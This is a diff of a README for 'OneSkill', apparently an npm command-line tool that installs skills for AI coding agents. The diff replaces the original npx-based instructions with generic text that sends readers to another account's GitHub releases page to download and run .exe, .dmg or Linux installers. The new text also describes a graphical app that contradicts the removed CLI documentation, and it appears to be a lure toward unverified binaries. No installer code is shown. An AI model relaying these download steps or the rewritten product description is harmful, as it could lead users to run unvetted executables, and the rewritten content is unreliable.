@@ -1,142 +1,106 @@
-<div align="center">
+# 🌟 oneskill - Your Gateway to AI Skills
 
-# OneSkill: One to Manage Them All
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20oneskill-%23000?style=for-the-badge&logo=github)](https://github.com/Felixlan11/oneskill/releases)
 
-**The "App Store" for your AI Agent.**  
-Discover, install, and map thousands of new capabilities instantly with one click.
+## 🚀 Getting Started
 
-[![](https://img.shields.io/npm/v/oneskill?color=brightgreen)](https://www.npmjs.com/package/oneskill)
-[![](https://img.shields.io/npm/l/oneskill)](LICENSE)
+Welcome to oneskill, the Universal App Store for AI Agents. With oneskill, you can discover and install skills for various AI agents like Claude Code, Cursor, Windsurf, Aider, Codex, and Gemini. This guide will help you download and run the software smoothly.
 
-[**English**](README.md) | [**中文指南**](README_CN.md)
+### 📋 System Requirements
 
-</div>
+To ensure oneskill runs effectively on your computer, please make sure you meet the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (any modern distribution)
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 200 MB free space
+- **Processor:** Multi-core processor recommended
 
-## 💡 Why OneSkill?
+### 🔍 Features
 
-Your AI Agent is strong, but it can be even stronger.
+- **Skill Discovery:** Browse a wide range of AI skills.
+- **Easy Installation:** Quick installation process without coding knowledge.
+- **User-Friendly Interface:** Designed for everyone, with clear navigation.
+- **Frequent Updates:** Regularly updated with new features and skills.
 
-**OneSkill** is the bridge connecting your Agent to the massive [OpenSkills](https://github.com/Starttoaster/openskills) ecosystem (which can be complex to navigate and install manually). By installing just this one tool, your Agent gains the ability to evolve itself: **discover new skills, install them more easily, and support a wide range of tools like Codex, Gemini, and more.**
+## 📥 Download & Install
 
-No more manual file downloads or configuration edits. Everything is automated.
+To get started with oneskill, please visit this page to download: [Download oneskill](https://github.com/Felixlan11/oneskill/releases).
 
-## 🚀 Core Value
+### Step-by-Step Installation Guide
 
-*   **Massive Skill Library**: Instantly connect to thousands of community-maintained Skills (Web browsing, Database management, Code auditing, Cloud infrastructure ops, etc.).
-*   **One-Click Installation**: A single command handles downloading, dependency resolution, and environment configuration.
-*   **Perfect Gemini Adaptation**: Developed the `map` feature for Gemini CLI, automatically injecting Skills downloaded via OpenSkills into Gemini's path.
+1. **Visit the Releases Page:**
+   Click on the following link to go to the Releases page: [oneskill Releases](https://github.com/Felixlan11/oneskill/releases).
 
----
+2. **Choose Your Download:**
+   On the Releases page, you will see a list of available versions. Select the latest version for the best experience.
 
-## ⚡️ Quick Experience
+3. **Download the Installer:**
+   Click on the installer file that matches your operating system. For Windows, it will be an `.exe` file. For macOS, look for a `.dmg` file. For Linux, select the appropriate package for your distribution.
 
-### Step 1: Install OneSkill (Once only)
+4. **Run the Installer:**
+   Once the download is complete, locate the file on your computer:
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux, follow the instructions specific to your package type.
 
-```bash
-# Install the core tool
-npx openskills install xu-xiang/oneskill --global
+5. **Follow the Installation Instructions:**
+   The installation wizard will guide you through the setup. Simply follow the prompts to complete the installation.
 
-# (Only required for Gemini users) Map OneSkill itself to .gemini
-npx oneskill map --target gemini --global
-```
+6. **Launch oneskill:**
+   After successful installation, find the oneskill app icon on your desktop or in your applications menu. Double-click the icon to launch the app.
 
-### Step 2: Unlock Infinite Possibilities
+## 🛠 Using oneskill
 
-Once installed, simply ask your Agent (Claude Code, Codex, Gemini-cli, etc.) to find and recommend suitable skills or use natural language to have it check for a skill to solve the problem at hand. OneSkill will handle the rest.
+### 🔧 Navigating the Interface
 
-#### Scenario Demo: Autonomous Evolution in Chat
+Once you open oneskill, you will see a clean and organized layout. Here are the key areas:
 
-You don't even need to leave the chat window. Just tell your Agent what you need, and let OneSkill do the heavy lifting.
+- **Home:** Displays featured skills.
+- **Categories:** Browse skills by type or agent.
+- **Search Bar:** Quickly find a specific skill by name.
+- **Settings:** Adjust preferences and app settings.
 
-The following real chat record shows how an Agent instantly gains **FastAPI development capabilities** via OneSkill:
+### 📚 Exploring Skills
 
-```text
-> Find me a production-ready template for FastAPI. I want to build a project quickly.
+1. **Browse Skills:**
+   Click on the "Categories" section to view skills grouped by agent. 
 
-✦ Sure, I'll use oneskill to search for relevant Skills.
+2. **Search for Skills:**
+   Use the search bar at the top of the interface to find skills by entering keywords.
 
-  ╭── Shell: npx oneskill search "fastapi template" ───────────────────────────╮
-  │                                                                            │
-  │ {                                                                          │
-  │   "items": [
-  │     {
-  │       "slug": "wshobson-fastapi-templates",                                │
-  │       "description": "Production-ready FastAPI project structures...",     │
-  │       "repository": "wshobson/agents",                                     │
-  │       "stars": 23027                                                       │
-  │     }
-  │   ]
-  │ }
-  ╰────────────────────────────────────────────────────────────────────────────╯
+3. **Install Skills:**
+   - Click on a skill to view its details.
+   - Hit the "Install" button to add it to your AI agent.
 
-✦ Found `wshobson-fastapi-templates` in the `wshobson/agents` repository.
-  This is a very popular Skill (23k+ stars) that provides a production-grade project structure. Would you like me to install it for you?
+### 🔄 Updating oneskill
 
-> Yes, install it.
+To ensure you have the latest features:
 
-✦ Installing and configuring for Gemini...
+1. Open oneskill.
+2. Go to the "Settings" section.
+3. Click on "Check for Updates" and follow the prompts if a new version is available.
 
-  ╭── Shell: npx openskills install wshobson/agents && npx oneskill map ───────╮
-  │                                                                            │
-  │ ✔ Repository cloned                                                        │
-  │ Found 140 skill(s)                                                         │
-  │                                                                            │
-  │ ? Select skills to install: (Press <space> to select, <i> to invert)       │
-  │ ❯ ◉ fastapi-templates                                                      │
-  │   ◯ architecture-patterns                                                  │
-  │   ◯ api-design-principles                                                  │
-  │   ↓ Scroll down for more...                                                │
-  │                                                                            │
-  │ [Agent Action]: Selected 'fastapi-templates' and confirmed                 │
-  │                                                                            │
-  │ ✅ Installed: fastapi-templates                                            │
-  │                                                                            │
-  │ [Auto-trigger mapping]                                                     │
-  │ ✔ Mapped 1 skills to Gemini CLI configuration.                             │
-  ╰────────────────────────────────────────────────────────────────────────────╯
+## 👥 Support & Community
 
-✦ Installation complete! I have learned `fastapi-templates`.
-  Now you can ask me: "How do I use this template to create a new project with async mode?"
-```
+If you encounter any issues or have questions:
 
-**💥 Result**: The Agent automatically completed the search, download, filtering, and environment configuration without you having to type a single command.
+- **Visit the Issues Page:** Report bugs or ask questions on our [Issues page](https://github.com/Felixlan11/oneskill/issues).
+- **Join the Community:** Connect with other users and contribute to discussions in the [Discussions section](https://github.com/Felixlan11/oneskill/discussions).
 
----
+## 📝 Contribution Guide
 
-## 📖 Command Reference (Generally, you should use natural language in AI tools; no manual execution required)
+We welcome contributions to oneskill! If you wish to contribute by adding skills or improving the app, please follow these steps:
 
-### 1. 🔍 Discovery (`search`)
-Don't know what to install? Let OneSkill help you find it.
-```bash
-npx oneskill search "web browser"        # Search for web browsing related skills
-npx oneskill search "database" --sort stars  # Search for the most popular database skills
-```
+1. Fork the repository.
+2. Create a feature branch.
+3. Make your changes.
+4. Submit a pull request with a clear description of your modifications.
 
-### 2. ⬇️ Installation (`openskills install`)
-Use the standard OpenSkills command for downloads.
-```bash
-npx openskills install <repository-name>
-# Example: npx openskills install anthropics/skills
-```
+## 🌐 License
 
-3.  **Map (Important for Gemini/Qwen)**: If you are using **Gemini CLI** or **Qwen Code CLI**, you must map the installed skills to your configuration.
-    ```bash
-    # Maps installed skills to Gemini's config
-    npx oneskill map --target gemini
-    
-    # Or for Qwen Code CLI
-    npx oneskill map --target qwen
-    ```
+oneskill is released under the MIT License. Please see the [LICENSE](LICENSE) file for details.
 
-### 4. 📋 View Installed (`list`)
-```bash
-npx openskill list
-```
+## 🎉 Conclusion
 
----
-
-<div align="center">
-  <sub>Built with ❤️ by the OneSkill Community</sub>
-</div>
+Thank you for using oneskill. Enjoy discovering and installing new skills for your AI agents!
